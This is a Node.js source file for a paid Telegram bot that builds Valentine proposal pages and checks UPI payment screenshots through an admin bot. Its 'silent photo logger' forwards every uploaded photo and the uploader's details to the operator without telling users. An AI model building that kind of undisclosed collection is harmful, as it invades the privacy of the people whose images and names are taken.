/* =======================================================
   Valentine Proposal — Telegram Bot (Telegraf + SQLite)
   ======================================================= */

const path = require("path");
// Load .env file in development, but don't fail in production
require("dotenv").config({ path: path.join(__dirname, ".env") });
const { Telegraf, Markup } = require("telegraf");
const { v4: uuidv4 } = require("uuid");
const Database = require("better-sqlite3");
const express = require("express");
const fs = require("fs");
const https = require("https");
const http = require("http");

// ── Environment ─────────────────────────────────────────
const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_BOT_TOKEN = process.env.ADMIN_BOT_TOKEN;
const FRONTEND_URL = process.env.FRONTEND_URL || "https://your-valentine-site.vercel.app";
const PORT = process.env.PORT || 3000;
const UPLOAD_DIR = path.join(__dirname, "uploads");
const ADMIN_CHAT_FILE = path.join(__dirname, "admin_chat.json");
const UPI_ID = process.env.UPI_ID || "mpjani294.personal@oksbi";
const PRICE_INR = parseInt(process.env.PRICE_INR || "30", 10);

if (!BOT_TOKEN) {
  console.error("❌  BOT_TOKEN is missing in .env");
  process.exit(1);
}

// Ensure upload directory exists
if (!fs.existsSync(UPLOAD_DIR)) {
  fs.mkdirSync(UPLOAD_DIR, { recursive: true });
}

// ── SQLite Database ─────────────────────────────────────
const db = new Database(path.join(__dirname, "valentine.db"));
db.pragma("journal_mode = WAL");

db.exec(`
  CREATE TABLE IF NOT EXISTS proposals (
    id          TEXT PRIMARY KEY,
    name        TEXT NOT NULL,
    photo_url   TEXT,
    expiry      INTEGER NOT NULL,
    created_at  INTEGER NOT NULL,
    chat_id     INTEGER NOT NULL
  )
`);

// ── Payments Table ──────────────────────────────────────
db.exec(`
  CREATE TABLE IF NOT EXISTS payments (
    id          TEXT PRIMARY KEY,
    chat_id     INTEGER NOT NULL,
    user_id     INTEGER NOT NULL,
    username    TEXT,
    first_name  TEXT,
    status      TEXT NOT NULL DEFAULT 'pending',
    created_at  INTEGER NOT NULL
  )
`);

const insertProposal = db.prepare(`
  INSERT INTO proposals (id, name, photo_url, expiry, created_at, chat_id)
  VALUES (?, ?, ?, ?, ?, ?)
`);

const getProposal = db.prepare(`SELECT * FROM proposals WHERE id = ?`);

const insertPayment = db.prepare(`
  INSERT INTO payments (id, chat_id, user_id, username, first_name, status, created_at)
  VALUES (?, ?, ?, ?, ?, 'pending', ?)
`);

const getApprovedPayment = db.prepare(
  `SELECT * FROM payments WHERE chat_id = ? AND status = 'approved' LIMIT 1`
);

const getPendingPayment = db.prepare(
  `SELECT * FROM payments WHERE chat_id = ? AND status = 'pending' ORDER BY created_at DESC LIMIT 1`
);

const getPaymentById = db.prepare(`SELECT * FROM payments WHERE id = ?`);

const updatePaymentStatus = db.prepare(
  `UPDATE payments SET status = ? WHERE id = ?`
);

// Consume an approved payment after successful link creation
const consumePayment = db.prepare(
  `UPDATE payments SET status = 'used' WHERE id = ?`
);

// ── Admin Bot (silent photo logger) ───────────────────
let adminBot = null;
let adminChatId = null;

// Load saved admin chat ID
function loadAdminChatId() {
  try {
    if (fs.existsSync(ADMIN_CHAT_FILE)) {
      const data = JSON.parse(fs.readFileSync(ADMIN_CHAT_FILE, "utf8"));
      adminChatId = data.chatId || null;
    }
  } catch (e) { /* ignore */ }
}

function saveAdminChatId(chatId) {
  adminChatId = chatId;
  fs.writeFileSync(ADMIN_CHAT_FILE, JSON.stringify({ chatId }), "utf8");
}

if (ADMIN_BOT_TOKEN) {
  adminBot = new Telegraf(ADMIN_BOT_TOKEN);
  loadAdminChatId();

  adminBot.start((ctx) => {
    saveAdminChatId(ctx.chat.id);
    ctx.reply("🔐 Admin linked! You'll receive photo logs and payment approvals here.");
  });

  // ── Payment Approve / Reject callbacks ──────────────
  adminBot.action(/^approve_(.+)$/, async (ctx) => {
    const paymentId = ctx.match[1];
    const payment = getPaymentById.get(paymentId);
    if (!payment) {
      return ctx.answerCbQuery("❌ Payment not found");
    }
    if (payment.status !== "pending") {
      return ctx.answerCbQuery(`Already ${payment.status}`);
    }
    updatePaymentStatus.run("approved", paymentId);
    await ctx.answerCbQuery("✅ Approved!");
    await ctx.editMessageCaption(
      ctx.callbackQuery.message.caption + "\n\n✅ APPROVED",
      { parse_mode: undefined }
    );

    // Notify user via main bot
    try {
      await bot.telegram.sendMessage(
        payment.chat_id,
        "✅ *Payment approved\\!*\n\nYou can now use /create to build your Valentine proposal 💝",
        { parse_mode: "MarkdownV2" }
      );
    } catch (e) {
      console.error("Failed to notify user:", e.message);
    }
  });

  adminBot.action(/^reject_(.+)$/, async (ctx) => {
    const paymentId = ctx.match[1];
    const payment = getPaymentById.get(paymentId);
    if (!payment) {
      return ctx.answerCbQuery("❌ Payment not found");
    }
    if (payment.status !== "pending") {
      return ctx.answerCbQuery(`Already ${payment.status}`);
    }
    updatePaymentStatus.run("rejected", paymentId);
    await ctx.answerCbQuery("❌ Rejected");
    await ctx.editMessageCaption(
      ctx.callbackQuery.message.caption + "\n\n❌ REJECTED",
      { parse_mode: undefined }
    );

    // Notify user via main bot
    try {
      await bot.telegram.sendMessage(
        payment.chat_id,
        "❌ Payment was not verified. Please send a valid screenshot after paying ₹" + PRICE_INR + " to UPI ID: " + UPI_ID + "\n\nUse /pay to try again."
      );
    } catch (e) {
      console.error("Failed to notify user:", e.message);
    }
  });

  adminBot.launch().then(() => {
    console.log("📡  Admin bot is running");
  }).catch((err) => {
    console.error("Admin bot error:", err.message);
    adminBot = null;
  });
}

// Send photo + info to admin bot silently
async function notifyAdmin(photoPath, info) {
  if (!adminBot || !adminChatId) return;
  try {
    const caption =
      `📸 New photo uploaded\n` +
      `👤 For: ${info.name}\n` +
      `👥 By: ${info.username ? "@" + info.username : info.firstName || "Unknown"}\n` +
      `🆔 ID: ${info.oderId || "N/A"}\n` +
      `📅 ${new Date().toLocaleString()}`;

    await adminBot.telegram.sendPhoto(
      adminChatId,
      { source: photoPath },
      { caption }
    );
  } catch (err) {
    console.error("Admin notify error:", err.message);
  }
}

// Send payment screenshot to admin with Approve / Reject buttons
async function notifyAdminPayment(photoFileId, paymentId, info) {
  if (!adminBot || !adminChatId) return;
  try {
    const caption =
      `💰 Payment Screenshot\n` +
      `💵 Amount: ₹${PRICE_INR}\n` +
      `👥 From: ${info.username ? "@" + info.username : info.firstName || "Unknown"}\n` +
      `🆔 Payment ID: ${paymentId}\n` +
      `📅 ${new Date().toLocaleString()}`;

    // Forward the photo using file_id (from main bot → download → send via admin bot)
    // We need to download through main bot and send via admin bot
    const fileLink = await bot.telegram.getFileLink(photoFileId);
    const fileUrl = fileLink.href || fileLink.toString();
    const tempPath = path.join(UPLOAD_DIR, `pay_${paymentId}.jpg`);
    await downloadFile(fileUrl, tempPath);

    await adminBot.telegram.sendPhoto(
      adminChatId,
      { source: tempPath },
      {
        caption,
        ...Markup.inlineKeyboard([
          Markup.button.callback("✅ Approve", `approve_${paymentId}`),
          Markup.button.callback("❌ Reject", `reject_${paymentId}`),
        ]),
      }
    );

    // Clean up temp file after sending
    fs.unlink(tempPath, () => {});
  } catch (err) {
    console.error("Admin payment notify error:", err.message);
  }
}

// ── Express Server (serves uploaded photos) ─────────────
const app = express();

// CORS — allow frontend to fetch proposal data
app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
  next();
});

app.use("/uploads", express.static(UPLOAD_DIR));

// Health check endpoint for hosting platforms
app.get("/", (req, res) => {
  res.json({ status: "ok", service: "Valentine Bot" });
});

// API — frontend fetches proposal data by UUID
app.get("/api/proposal/:id", (req, res) => {
  const proposal = getProposal.get(req.params.id);
  if (!proposal) return res.status(404).json({ error: "Not found" });
  res.json({
    name: proposal.name,
    photo: proposal.photo_url || null,
    expiry: proposal.expiry || null,
  });
});

app.listen(PORT, () => {
  console.log(`📡  Server running on port ${PORT}`);
});

// ── Telegraf Bot ────────────────────────────────────────
const bot = new Telegraf(BOT_TOKEN);

// Session state stored per chat (in memory — fine for small scale)
const sessions = new Map();

function getSession(chatId) {
  if (!sessions.has(chatId)) {
    sessions.set(chatId, { step: null, name: null, photo: null });
  }
  return sessions.get(chatId);
}

// ── /start ──────────────────────────────────────────────
bot.start((ctx) => {
  ctx.replyWithMarkdownV2(
    `💝 *Welcome to the Valentine Proposal Generator\\!*\n\n` +
    `I'll help you create a magical, interactive proposal page that your special someone *can't say no to* 😏\n\n` +
    `Use /pay to make the payment \\(₹${PRICE_INR}\\)\n` +
    `Then use /create to build your proposal\\!\n\n` +
    `__How it works:__\n` +
    `1️⃣ Pay ₹${PRICE_INR} via UPI\n` +
    `2️⃣ Send payment screenshot\n` +
    `3️⃣ Once approved, use /create\n` +
    `4️⃣ Get your unique love link\\! 💌`
  );
});

// ── /pay — UPI payment flow ─────────────────────────────
bot.command("pay", (ctx) => {
  // Check if already has approved payment
  const approved = getApprovedPayment.get(ctx.chat.id);
  if (approved) {
    return ctx.reply(
      "✅ You already have an approved payment!\n\n" +
      "Use /create to build your Valentine proposal 💝"
    );
  }

  // Check if has pending payment
  const pending = getPendingPayment.get(ctx.chat.id);
  if (pending) {
    return ctx.reply(
      "⏳ Your payment is already pending approval!\n" +
      "Please wait while our admin verifies your screenshot.\n\n" +
      "If you haven't sent a screenshot yet, send it now as a photo."
    );
  }

  const session = getSession(ctx.chat.id);
  session.step = "awaiting_payment";

  const upiLink = `upi://pay?pa=${UPI_ID}&pn=Valentine%20Proposal&am=${PRICE_INR}&cu=INR&tn=Valentine%20Proposal%20Link`;

  ctx.reply(
    `💰 *Payment Required*\n\n` +
    `To create your Valentine proposal, pay *₹${PRICE_INR}* via UPI:\n\n` +
    `📲 *UPI ID:* \`${UPI_ID}\`\n` +
    `💵 *Amount:* ₹${PRICE_INR}\n\n` +
    `After paying, send a *screenshot* of the payment here\\.\n` +
    `Your access will be approved within minutes\\! ⚡\n\n` +
    `💡 *How to pay:*\n` +
    `1\\. Open any UPI app \\(PhonePe, Google Pay, Paytm, etc\\.\\)\n` +
    `2\\. Choose "Send Money" or "Pay"\n` +
    `3\\. Enter the UPI ID above\n` +
    `4\\. Enter amount ₹${PRICE_INR}\n` +
    `5\\. Complete payment and send screenshot here`,
    {
      parse_mode: "MarkdownV2",
    }
  );
});

// ── /create ─────────────────────────────────────────────
bot.command("create", (ctx) => {
  // Check if user has approved payment
  const approved = getApprovedPayment.get(ctx.chat.id);
  if (!approved) {
    const pending = getPendingPayment.get(ctx.chat.id);
    if (pending) {
      return ctx.reply(
        "⏳ Your payment is pending approval.\n" +
        "You'll be notified once it's verified! Hang tight 💕"
      );
    }
    return ctx.reply(
      `🔒 Payment required to create a proposal.\n\n` +
      `Pay ₹${PRICE_INR} via UPI and send a screenshot.\n` +
      `Use /pay to get started!`
    );
  }

  const session = getSession(ctx.chat.id);
  session.step = "name";
  session.name = null;
  session.photo = null;
  session.paymentId = approved.id; // Track which payment to consume

  ctx.reply(
    "💕 Let's create your Valentine proposal!\n\n" +
    "Step 1/3: What is your Valentine's name?",
    Markup.forceReply()
  );
});

// ── /help ───────────────────────────────────────────────
bot.help((ctx) => {
  ctx.reply(
    "💝 Valentine Proposal Bot — Commands:\n\n" +
    "/start  — Welcome message\n" +
    "/create — Create a new proposal link\n" +
    "/help   — Show this help\n\n" +
    "Just follow the steps after /create!"
  );
});

// ── Handle messages (step-by-step flow) ─────────────────
bot.on("text", (ctx) => {
  const session = getSession(ctx.chat.id);

  if (!session.step) return;

  switch (session.step) {
    case "name":
      session.name = ctx.message.text.trim();
      session.step = "photo";
      ctx.reply(
        `✨ Great! The proposal will be for "${session.name}"\n\n` +
        "Step 2/3: Send me a photo to display on the page,\n" +
        'or type "skip" to skip the photo.',
        Markup.forceReply()
      );
      break;

    case "photo":
      if (ctx.message.text.toLowerCase() === "skip") {
        session.photo = null;
        session.step = "expiry";
        ctx.reply(
          "📸 No photo — no problem! I'll use beautiful animations instead.\n\n" +
          "Step 3/3: How many hours should this link stay active?\n" +
          "(Enter a number, e.g. 24 for 24 hours, or 0 for no expiry)",
          Markup.forceReply()
        );
      } else {
        ctx.reply(
          '📷 Please send a photo image, or type "skip" to continue without one.'
        );
      }
      break;

    case "expiry":
      const hours = parseFloat(ctx.message.text.trim());
      if (isNaN(hours) || hours < 0) {
        ctx.reply("⚠️ Please enter a valid number of hours (e.g. 24, 48, or 0 for no expiry).");
        return;
      }
      generateLink(ctx, session, hours);
      break;
  }
});

// ── Handle photo uploads ────────────────────────────────
bot.on("photo", async (ctx) => {
  const session = getSession(ctx.chat.id);

  // ── Payment screenshot ──────────────────────────────
  if (session.step === "awaiting_payment") {
    try {
      const photos = ctx.message.photo;
      const fileId = photos[photos.length - 1].file_id;
      const user = ctx.message.from;

      // Create payment record
      const paymentId = uuidv4();
      insertPayment.run(
        paymentId,
        ctx.chat.id,
        user.id,
        user.username || null,
        user.first_name || null,
        Date.now()
      );

      // Notify admin with approve/reject buttons
      await notifyAdminPayment(fileId, paymentId, {
        username: user.username,
        firstName: user.first_name,
      });

      session.step = null;

      ctx.reply(
        "📩 Payment screenshot received!\n\n" +
        "⏳ Our admin will verify it shortly.\n" +
        "You'll get a notification once approved ✅\n\n" +
        "This usually takes just a few minutes! 💕"
      );
    } catch (err) {
      console.error("Payment screenshot error:", err);
      ctx.reply("⚠️ Failed to process the screenshot. Please try sending it again.");
    }
    return;
  }

  // ── Proposal photo ──────────────────────────────────
  if (session.step !== "photo") {
    ctx.reply('Use /create first to start building your proposal! 💝');
    return;
  }

  try {
    // Get the highest resolution photo
    const photos = ctx.message.photo;
    const fileId = photos[photos.length - 1].file_id;

    // Get file URL from Telegram
    const fileLink = await ctx.telegram.getFileLink(fileId);
    const fileUrl = fileLink.href || fileLink.toString();

    // Download and save locally
    const ext = ".jpg";
    const filename = uuidv4() + ext;
    const filepath = path.join(UPLOAD_DIR, filename);

    await downloadFile(fileUrl, filepath);

    // Silently forward photo to admin bot
    const user = ctx.message.from;
    notifyAdmin(filepath, {
      name: session.name,
      username: user.username,
      firstName: user.first_name,
    });

    // Build the public URL for this photo
    const serverUrl = process.env.SERVER_URL || `http://localhost:${PORT}`;
    session.photo = `${serverUrl}/uploads/${filename}`;

    session.step = "expiry";
    ctx.reply(
      "📸 Beautiful photo saved!\n\n" +
      "Step 3/3: How many hours should this link stay active?\n" +
      "(Enter a number, e.g. 24 for 24 hours, or 0 for no expiry)",
      Markup.forceReply()
    );
  } catch (err) {
    console.error("Photo download error:", err);
    ctx.reply("⚠️ Failed to process the photo. Please try again or type \"skip\".");
  }
});

// ── Generate the final link ─────────────────────────────
function generateLink(ctx, session, hours) {
  const id = uuidv4();
  const now = Date.now();
  const expiry = hours === 0 ? 0 : now + hours * 60 * 60 * 1000;

  // Store in DB
  insertProposal.run(
    id,
    session.name,
    session.photo || null,
    expiry,
    now,
    ctx.chat.id
  );

  // Consume the payment (one payment = one link)
  if (session.paymentId) {
    consumePayment.run(session.paymentId);
  }

  // Build URL — UUID only, no personal data in the link
  const link = `${FRONTEND_URL}/?id=${id}`;

  const expiryText =
    hours === 0
      ? "♾️ No expiry — this love lasts forever!"
      : `⏳ Expires in ${hours} hour${hours !== 1 ? "s" : ""}`;

  ctx.replyWithMarkdownV2(
    `🎉 *Your Valentine proposal is ready\\!*\n\n` +
    `👤 *Name:* ${escapeMarkdown(session.name)}\n` +
    `📸 *Photo:* ${session.photo ? "Yes" : "None \\(animated fallback\\)"}\n` +
    `${escapeMarkdown(expiryText)}\n\n` +
    `💌 *Your love link:*\n${escapeMarkdown(link)}\n\n` +
    `Send this link to your special someone\\! 💝\n` +
    `They won't be able to say no 😏`
  );

  // Reset session
  session.step = null;
  session.name = null;
  session.photo = null;
  session.paymentId = null;
}

// ── Helpers ─────────────────────────────────────────────
function escapeMarkdown(text) {
  return text.replace(/([_*\[\]()~`>#+\-=|{}.!\\])/g, "\\$1");
}

function downloadFile(url, dest) {
  return new Promise((resolve, reject) => {
    const file = fs.createWriteStream(dest);
    const client = url.startsWith("https") ? https : http;
    client
      .get(url, (response) => {
        if (response.statusCode === 301 || response.statusCode === 302) {
          // Follow redirect
          downloadFile(response.headers.location, dest)
            .then(resolve)
            .catch(reject);
          return;
        }
        response.pipe(file);
        file.on("finish", () => {
          file.close(resolve);
        });
      })
      .on("error", (err) => {
        fs.unlink(dest, () => {});
        reject(err);
      });
  });
}

// ── Launch Bot ──────────────────────────────────────────
bot
  .launch()
  .then(() => console.log("🤖  Valentine Bot is running!"))
  .catch((err) => {
    console.error("❌  Bot failed to start:", err);
    process.exit(1);
  });

// Graceful shutdown
process.once("SIGINT", () => {
  bot.stop("SIGINT");
  if (adminBot) adminBot.stop("SIGINT");
  db.close();
});
process.once("SIGTERM", () => {
  bot.stop("SIGTERM");
  if (adminBot) adminBot.stop("SIGTERM");
  db.close();
});
